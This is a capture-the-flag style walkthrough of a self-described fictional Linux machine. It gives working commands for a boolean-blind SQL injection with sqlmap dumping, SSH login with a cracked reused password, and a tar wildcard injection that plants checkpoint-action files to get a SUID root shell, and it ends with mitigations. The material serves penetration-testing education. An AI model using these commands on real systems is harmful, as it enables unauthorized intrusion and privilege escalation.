> **Disclaimer:** Citadel is a fictional machine used to illustrate a typical
> medium-difficulty methodology. Everything here is invented for the example.

## Overview

Citadel walks through a clean attack chain: enumerate a web app, exploit a
blind SQL injection to recover credentials, get a shell, and finally abuse a
root cron job that handles user-controlled files unsafely.

| | |
|------------------|----------------------|
| **Difficulty**   | Medium               |
| **OS**           | Linux                |
| **Initial**      | Blind SQLi → creds   |
| **Privesc**      | cron + tar wildcard  |

## Enumeration

As always, start with a full port scan:

```bash
nmap -p- --min-rate 2000 -sV -oN nmap.txt 10.10.11.42
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

The web app on port 80 is an internal "asset tracker" with a login form and an
asset lookup endpoint at `/assets?id=1`.

## Foothold — blind SQL injection

The `id` parameter is injectable but returns no visible output, so it's a
classic boolean-blind case. A `true`/`false` differential confirms it:

```
/assets?id=1 AND 1=1   ->  "Asset found"
/assets?id=1 AND 1=2   ->  "No such asset"
```

Rather than hand-roll the extraction, `sqlmap` handles the dump:

```bash
sqlmap -u "http://10.10.11.42/assets?id=1" \
       --batch --dump -T users -D citadel
```

That recovers a bcrypt hash for the user `m.reeves`, which cracks to a reused
SSH password. From there:

```bash
ssh m.reeves@10.10.11.42
m.reeves@citadel:~$ id
uid=1001(m.reeves) gid=1001(m.reeves) groups=1001(m.reeves)
```

First flag secured.

## Privilege escalation — tar wildcard injection

Looking for scheduled jobs reveals a root cron entry:

```bash
cat /etc/cron.d/backup
# * * * * * root cd /opt/reports && tar czf /backups/reports.tgz *
```

The `*` glob expands to filenames in `/opt/reports`, which `m.reeves` can write
to. `tar` interprets filenames that start with `--` as options — the classic
**wildcard injection**. We plant a malicious checkpoint action:

```bash
cd /opt/reports
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
```

On the next cron tick, `tar` happily executes our script as root. Cash it in:

```bash
m.reeves@citadel:/opt/reports$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(m.reeves) euid=0(root) gid=1001(m.reeves) groups=1001(m.reeves)
```

Root flag obtained.

## Takeaways

- **Blind doesn't mean safe.** A boolean differential is all you need; no error
  messages required.
- **Wildcards in privileged scripts are dangerous.** Any `tar *`, `chown *`, or
  `chmod *` running as root over a writable directory is an escalation primitive.
- **Mitigation:** pin globs (`tar czf out.tgz ./`) or pass `--` before the file
  list so options can't be injected.

Citadel is a great reminder that the boring misconfigurations — a reused
password and a sloppy cron job — are still what gets you to root.
